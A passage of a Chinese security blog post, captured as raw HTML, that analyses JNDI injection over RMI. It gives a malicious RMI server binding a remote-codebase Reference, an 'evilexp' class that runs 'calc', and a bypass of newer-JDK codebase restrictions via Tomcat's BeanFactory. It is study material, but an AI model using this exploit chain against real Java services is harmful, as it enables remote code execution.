e.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$ result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); å‚è€ƒï¼š\nhttps://tttang.com/archive/1611/#toc__2\nhttps://exp10it.io/2022/12/jndi-injection/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC-jdk-%E9%99%90%E5%88%B6\n",
  "wordCount" : "4014",
  "inLanguage": "zh",
  "datePublished": "2025-01-23T20:01:23+08:00",
  "dateModified": "2025-01-23T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/jndi/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      JNDI
    </h1>
    <div class="post-meta"><span title='2025-01-23 20:01:23 +0800 CST'>2025-01-23</span>&nbsp;Â·&nbsp;9 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#0x01-rmi" aria-label="0x01 RMI">0x01 RMI</a><ul>
                            
                    <li>
                        <a href="#0x02-%e5%88%86%e6%9e%90" aria-label="0x02 åˆ†æ">0x02 åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#%e4%bd%8e%e7%89%88%e6%9c%acjdk" aria-label="ä½ç‰ˆæœ¬jdk">ä½ç‰ˆæœ¬jdk</a><ul>
                            
                    <li>
                        <a href="#%e5%b0%8f%e7%bb%93" aria-label="å°ç»“">å°ç»“</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e9%ab%98%e7%89%88%e6%9c%acjdk" aria-label="é«˜ç‰ˆæœ¬jdk">é«˜ç‰ˆæœ¬jdk</a><ul>
                            
                    <li>
                        <a href="#try1-%e6%9c%ac%e5%9c%b0factory%e7%b1%bb" aria-label="try1 æœ¬åœ°Factoryç±»">try1 æœ¬åœ°Factoryç±»</a><ul>
                            
                    <li>
                        <a href="#beanfactory%e5%88%a9%e7%94%a8" aria-label="BeanFactoryåˆ©ç”¨">BeanFactoryåˆ©ç”¨</a><ul>
                            
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e5%b0%8f%e7%bb%93" aria-label="åˆ©ç”¨å°ç»“">åˆ©ç”¨å°ç»“</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#try2-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="try2 ååºåˆ—åŒ–">try2 ååºåˆ—åŒ–</a></li></ul>
                    </li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#0x03-ldap" aria-label="0x03 LDAP">0x03 LDAP</a><ul>
                            
                    <li>
                        <a href="#0x04-%e5%88%86%e6%9e%90" aria-label="0x04 åˆ†æ">0x04 åˆ†æ</a><ul>
                            
                    <li>
                        <a href="#%e4%bd%8e%e7%89%88%e6%9c%acjdk--8u191" aria-label="ä½ç‰ˆæœ¬jdk &amp;lt; 8u191">ä½ç‰ˆæœ¬jdk &lt; 8u191</a><ul>
                            
                    <li>
                        <a href="#c_lookup" aria-label="c_lookup">c_lookup</a></li>
                    <li>
                        <a href="#%e5%b0%8f%e7%bb%93-1" aria-label="å°ç»“">å°ç»“</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e9%ab%98%e7%89%88%e6%9c%acjdk-1" aria-label="é«˜ç‰ˆæœ¬jdk">é«˜ç‰ˆæœ¬jdk</a><ul>
                            
                    <li>
                        <a href="#try1-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="try1 ååºåˆ—åŒ–">try1 ååºåˆ—åŒ–</a></li>
                    <li>
                        <a href="#demo%e4%bb%a3%e7%a0%81" aria-label="demoä»£ç ">demoä»£ç </a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%82%b92" aria-label="ååºåˆ—åŒ–ç‚¹2">ååºåˆ—åŒ–ç‚¹2</a>
                    </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h1 id="0x01-rmi">0x01 RMI<a hidden class="anchor" aria-hidden="true" href="#0x01-rmi">#</a></h1>
<p>client</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">rmi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.NamingException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">client</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">().</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Jie&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ret: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ret</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">NamingException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Server</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Reference</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Server</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">factoryUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://localhost:1098/&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;evilexp&#34;</span><span class="p">,</span><span class="s">&#34;evilexp&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">factoryUrl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">reference</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Jie&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">wrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Server ready, factoryUrl:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">factoryUrl</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Server exception: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>evilexp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public class evilexp {
</span></span><span class="line"><span class="cl">    public evilexp() throws Exception{
</span></span><span class="line"><span class="cl">        Runtime.getRuntime().exec(&#34;calc&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    static {
</span></span><span class="line"><span class="cl">        System.out.println(&#34;Static block executed.&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><ol>
<li>åœ¨evilexp.classç›®å½•ä¸‹èµ·ä¸€ä¸ªæœåŠ¡</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">server</span><span class="w"> </span><span class="n">1098</span><span class="w">
</span></span></span></code></pre></div><ol start="2">
<li>å¯åŠ¨Server</li>
<li>å¯åŠ¨clientè°ƒç”¨è§¦å‘</li>
</ol>
<p><img loading="lazy" src="images/image-20250120163359649.png" alt="image-20250120163359649"  />
</p>
<h2 id="0x02-åˆ†æ">0x02 åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x02-åˆ†æ">#</a></h2>
<h3 id="ä½ç‰ˆæœ¬jdk">ä½ç‰ˆæœ¬jdk<a hidden class="anchor" aria-hidden="true" href="#ä½ç‰ˆæœ¬jdk">#</a></h3>
<p>lookupå¼€å§‹</p>
<p><img loading="lazy" src="images/image-20250123175250307.png" alt="image-20250123175250307"  />
</p>
<p><code>getURLOrDefaultInitCtx()</code>æ ¹æ®<code>rmiåè®®</code>è·å–åˆ°<code>rmiURLContextå¯¹è±¡</code></p>
<p><img loading="lazy" src="images/image-20250123175219845.png" alt="image-20250123175219845"  />
</p>
<p>ä¸€è·¯åˆ°æœ€åä¸€ä¸ªlookup</p>
<p><img loading="lazy" src="images/image-20250122104423148.png" alt="image-20250122104423148"  />
</p>
<p>lookupä¸€è·¯åˆ°<code>decodeObject()</code></p>
<p><img loading="lazy" src="images/image-20250122104538981.png" alt="image-20250122104538981"  />
</p>
<p>è·Ÿè¿›<code>NamingManager.getObjectInstance()</code></p>
<p><img loading="lazy" src="images/image-20250122104910551.png" alt="image-20250122104910551"  />
</p>
<p><code>getObjectFactoryFromReference()</code>ä¸­ä¼šè·å–æˆ‘ä»¬çš„<code>å‚åº“ç±»</code></p>
<p>ä¼šå…ˆæœ¬åœ°æŸ¥æ‰¾åŠ è½½è®¾ç½®çš„<code>factoryName</code>ç±»ï¼Œæ‰¾ä¸åˆ°ä¼šè¿œç¨‹<code>codebase</code>çš„åœ°å€å»åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»</p>
<p><img loading="lazy" src="images/image-20250122105020412.png" alt="image-20250122105020412"  />
</p>
<p>ç”¨Appè¿™ä¸ªåŠ è½½å™¨è¿›è¡ŒåŠ è½½</p>
<p><img loading="lazy" src="images/image-20250122105137152.png" alt="image-20250122105137152"  />
</p>
<p>è¿œç¨‹åŠ è½½ï¼Œ<code>FactoryURLClassLoader</code>æ˜¯<code>URLClassLoader</code>çš„å­ç±»</p>
<p><img loading="lazy" src="images/image-20250122105349232.png" alt="image-20250122105349232"  />
</p>
<p>ä¸Šé¢<code>Class.forName</code>ç¬¬äºŒä¸ªå‚æ•°æ˜¯<code>true</code>ï¼Œè¿™é‡ŒåŠ è½½çš„æ—¶å€™å°±èƒ½è§¦å‘<code>static</code>åŒºåŸŸçš„ä»£ç </p>
<p>å¾—åˆ°classåè¿›è¡Œ<code>å®ä¾‹åŒ–</code>ï¼Œè¿™é‡Œè§¦å‘<code>è‡ªæ„æ–¹æ³•</code>çš„ä»£ç ï¼ˆè¿™é‡Œä¼šè½¬åŒ–æˆ<code>ObjectFactory</code>ç±»ï¼Œæƒ³ä¸æŠ¥é”™ï¼Œæ¶æ„å¯ä»¥ç»§æ‰¿è¿™ä¸ªæ¥å£ï¼‰</p>
<p><img loading="lazy" src="images/image-20250122105706956.png" alt="image-20250122105706956"  />
</p>
<p>è¿”å›åè¿˜ä¼šè°ƒç”¨<code>getObjectInstance()</code>æ¬¡æ–¹æ³•</p>
<p><img loading="lazy" src="images/image-20250122105918362.png" alt="image-20250122105918362"  />
</p>
<h4 id="å°ç»“">å°ç»“<a hidden class="anchor" aria-hidden="true" href="#å°ç»“">#</a></h4>
<blockquote>
<p>å¾—ä¸‹é¢è¿™3ä¸ªä»£ç å—éƒ½èƒ½æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç </p>
<ul>
<li>
<p>staticåŒºåŸŸ</p>
</li>
<li>
<p>è‡ªæ„æ–¹æ³•</p>
</li>
<li>
<p>getObjectInstance()</p>
</li>
</ul>
</blockquote>
<h3 id="é«˜ç‰ˆæœ¬jdk">é«˜ç‰ˆæœ¬jdk<a hidden class="anchor" aria-hidden="true" href="#é«˜ç‰ˆæœ¬jdk">#</a></h3>
<p>åœ¨è°ƒç”¨<code>NamingManager.getObjectInstance()</code>å‰å¢åŠ äº†ä¸€ä¸ªæ£€æµ‹</p>
<p><img loading="lazy" src="images/image-20250122110235498.png" alt="image-20250122110235498"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var8</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">var8</span><span class="p">.</span><span class="na">getFactoryClassLocation</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">trustURLCodebase</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span></code></pre></div><p>var8æ˜¯æˆ‘ä»¬çš„<code>Reference</code>ï¼Œ<code>var8.getFactoryClassLocation()</code>å°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„è¿œç¨‹åœ°å€<code>codebase</code>ï¼Œ<code>trustURLCodebase</code>é»˜è®¤æ˜¯<code>false</code></p>
<p>è¿™é‡Œæ„æ€å°±æ˜¯é»˜è®¤ä¸è®©æˆ‘ä»¬è®¾ç½®<code>è¿œç¨‹åœ°å€</code>äº†ï¼Œä»è€Œé˜²å¾¡æˆ‘ä»¬è¿œç¨‹åŠ è½½æ¶æ„ç±»</p>
<h4 id="try1-æœ¬åœ°factoryç±»">try1 æœ¬åœ°Factoryç±»<a hidden class="anchor" aria-hidden="true" href="#try1-æœ¬åœ°factoryç±»">#</a></h4>
<p><strong>åˆ©ç”¨æœ¬åœ°Factoryç±» getObjectInstance()</strong></p>
<p>é‚£æˆ‘ä»¬æŠŠ<code>classFactoryLocation</code>è®¾ç½®æˆ<code>null</code>ï¼Œè¿™é‡Œ<code>Evil</code>æœ¬åœ°å¾—æœ‰ã€‚ç„¶åè¿›è¡Œè°ƒè¯•</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;Evil&#34;</span><span class="p">,</span><span class="s">&#34;Evil&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>æ²¡æœ‰è§¦å‘æŠ¥é”™ï¼Œæ¥åˆ°<code>getObjectFactoryFromReference</code>ï¼Œå‘ç°å…¶ä»£ç é€»è¾‘å¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œ<strong>è¿˜æ˜¯å…ˆæœ¬åœ°ï¼Œç„¶åè¿œç¨‹</strong>ï¼Œä½†æ˜¯å› ä¸ºå‰é¢<code>ifæ£€æµ‹</code>çš„é—®é¢˜ï¼Œè¿™é‡Œcodebaseåªèƒ½æ˜¯<code>null</code>ï¼Œé™¤éä¿®æ”¹<code>trustURLCodebase</code>ï¼ˆè°æ²¡äº‹æ”¹è¿™ç©æ„ï¼â€”â€”ï¼ï¼‰</p>
<p><img loading="lazy" src="images/image-20250122110928177.png" alt="image-20250122110928177"  />
</p>
<p>ç„¶åçš„è¯ï¼Œæƒ³é«˜ç‰ˆæœ¬åˆ©ç”¨rmiï¼Œå°±åªèƒ½åˆ©ç”¨<code>å®¢æˆ·ç«¯æœ¬åœ°çš„ç±»</code>ï¼Œä¸Šé¢3ä¸ªåˆ©ç”¨ç‚¹è¿˜æ˜¯é€‚ç”¨çš„ï¼Œä½†æ˜¯æƒ³æƒ³å…¶å®<code>static</code>å’Œ<code>è‡ªæ„æ–¹æ³•</code>ä¸å¤ªå¯èƒ½å­˜åœ¨åˆ©ç”¨çš„åœ°æ–¹ï¼Œæ‰€ä»¥å…¶å®è¿˜æ˜¯å»æ‰¾<code>getObjectInstance()</code>ï¼Œè¿™é‡Œæ‰¾çš„è¯å…¶å®å°±æœ‰æ€è·¯äº†<code>getObjectInstance()</code>æ˜¯<code>ObjectFactory</code>æ¥å£çš„æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬å»æ‰¾<code>ObjectFactoryçš„ç»§æ‰¿ç±»</code>å°±è¡Œã€‚</p>
<p>ä¸Šé¢è¿™ç§æ–¹å¼è‡ªç„¶ä¹Ÿä¾èµ–äºå…¶ä»–ç»„ä»¶ä¾èµ–ï¼Œæ·»åŠ ä¸‹é¢<code>tomcat</code>ä¾èµ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>tomcat-catalina<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>8.5.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>org.apache.tomcat.embed<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>tomcat-embed-el<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>8.5.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">rmi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.naming.ResourceRef</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.StringRefAddr</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="w"> </span><span class="p">{</span><span class="w">
